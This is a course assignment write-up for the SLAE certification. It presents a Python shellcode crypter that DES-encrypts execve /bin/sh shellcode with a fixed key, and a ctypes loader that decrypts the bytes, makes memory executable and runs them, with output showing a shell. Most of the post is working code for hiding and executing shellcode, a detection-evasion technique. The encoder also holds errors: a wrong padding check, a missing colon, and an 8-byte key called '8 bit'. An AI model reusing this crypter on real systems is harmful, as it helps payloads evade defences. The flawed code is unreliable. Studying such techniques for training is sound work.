**Assignment 7**

Create a shellcode crypter
 
For this last SLAE assignment, I’ve created a shellcode crypter using the DES encryption using the pyCrypto library

Refer:https://pypi.org/project/pycrypto/

**Methadology**

	>Cryptor 

		DES Encryption
		Refer : https://en.wikipedia.org/wiki/Data_Encryption_Standard
		its a symmetric key encryption mechanism, due to the short keylength (56 bits) , its not very commonly used.

		For Cryptor a execve /bin/sh shell code is used


		Since the DES Encrypiton process ciphertext in a block of 8 , if the length of the shellcode is not a multiple of 8 , x90 is padded
		x90 , NOP doesnt really do anything ie xchg eax, eax , which wont cause a problem in our shellcode

		Crypter schema is achived using a python script which, takes a shellcode (execve /bin/sh) and padd x90 to make the shellcode a multiple of x90 and use pyCrypto library to encrypt the shellcode using DES
		the 8 bit key used is "aaaaaaaa"

			toor@ubuntu:~/Desktop/slae/Assignments/7$ cat encoder.py                                                                                             [12/288]
			#!/bin/python

			from Crypto.Cipher import DES
			import socket
			import sys
			import urllib


			shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"  #/bin/sh shellcode
			print(shellcode)

			print(" ")
			print("Length of the shellcode is "+str(len(shellcode)))
			print("Original Shellcode ")

			enc1 = ""

			for i in bytearray(shellcode):
 				enc1+="0x"
 				enc1+= "%02x," %(i & 0xff)

			print("----------------------")
			print(enc1.rstrip(','))

			if ((len(shellcode)/8)==0)                                      #check if padding is needed
 				print("boo no padding is required")
			else:
 				padding = 8 * ((len(shellcode)/8)+1) - len(shellcode)
 				shellcode = shellcode + "\x90"*padding                  #appending x90 to make the shellcode length a multiple of 8
 			print("Padding needed , appended  "+str(padding)+"""  \\x90 bytes""")         

			print(len(shellcode))

			cipher = DES.new("aaaaaaaa")                                    #DES encryption key
			encrypted_data = cipher.encrypt(shellcode)											   	#Encryption process

			enc2 = ""
			output= ""

			for i in bytearray(encrypted_data):
		 		enc2+="0x"
	 	 		enc2+= "%02x," %(i & 0xff)
 		 		output += "\\x"
  		 		output += '%02x'% i

			print("Encrypted Shellcode")
			print("----------------------")
			print(enc2.rstrip(','))																							#printing Encrypted shellcode

			print(output)

			toor@ubuntu:~/Desktop/slae/Assignments/7$



	>Decrypter

		Decrypter takes the DES encrypted shellcode and decrypt the shellcode using the same key(symmetric encryption) and run the shellcode


			toor@ubuntu:~/Desktop/slae/Assignments/7$ cat decoder.py
			#!/bin/python

			from Crypto.Cipher import DES
			import socket
			import sys
			from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
			import os
			
			encrypted_data = "\x9a\xa9\x7d\x8b\xc4\x0f\x1a\xca\xeb\x74\xae\x62\x66\x51\x01\xdd\xc2\x77\x52\xc5\x55\xb9\xdf\xe9\xb0\xbe\xff\xca\x98\x45\xc1\x9a"  
											#DES Encrypted shellcode
			cipher = DES.new("aaaaaaaa")																						#DES decryption key


			shellcode = cipher.decrypt(encrypted_data)                     	#DES Decryption



			libc = CDLL('libc.so.6')																						# Passing control on to the shellcode using libc.so
			#shellcode = shellcode.replace('\\x','').decode('hex')
			sc = c_char_p(shellcode)
			size = len(shellcode)
			addr = c_void_p(libc.valloc(size))
			memmove(addr, sc, size)
			libc.mprotect(addr, size, 0x7)
			run = cast(addr, CFUNCTYPE(c_void_p))
			run()
			toor@ubuntu:~/Desktop/slae/Assignments/7$


**Practical**

Lets take the execve /bin/sh shellcode and use "aaaaaaaaa" key to encrypt using DES

	toor@ubuntu:~/Desktop/slae/Assignments/7$ python encoder.py
	1▒Ph//shh/bin▒▒▒̀

	Length of the shellcode is 25
	Original Shellcode
	----------------------
	0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80
	Padding needed , appended  7  \x90 bytes
	32
	Encrypted Shellcode
	----------------------
	0x9a,0xa9,0x7d,0x8b,0xc4,0x0f,0x1a,0xca,0xeb,0x74,0xae,0x62,0x66,0x51,0x01,0xdd,0xc2,0x77,0x52,0xc5,0x55,0xb9,0xdf,0xe9,0xb0,0xbe,0xff,0xca,0x98,0x45,0xc1,0x9a
	\x9a\xa9\x7d\x8b\xc4\x0f\x1a\xca\xeb\x74\xae\x62\x66\x51\x01\xdd\xc2\x77\x52\xc5\x55\xb9\xdf\xe9\xb0\xbe\xff\xca\x98\x45\xc1\x9a
	toor@ubuntu:~/Desktop/slae/Assignments/7$


Lets take the encrypted payload and decrypt it using the same DES Key 

	toor@ubuntu:~/Desktop/slae/Assignments/7$ python decoder.py
	$ id
	uid=1000(toor) gid=1000(toor) groups=1000(toor),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
	$


	Works like a charm 


**Github Repo**

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1509
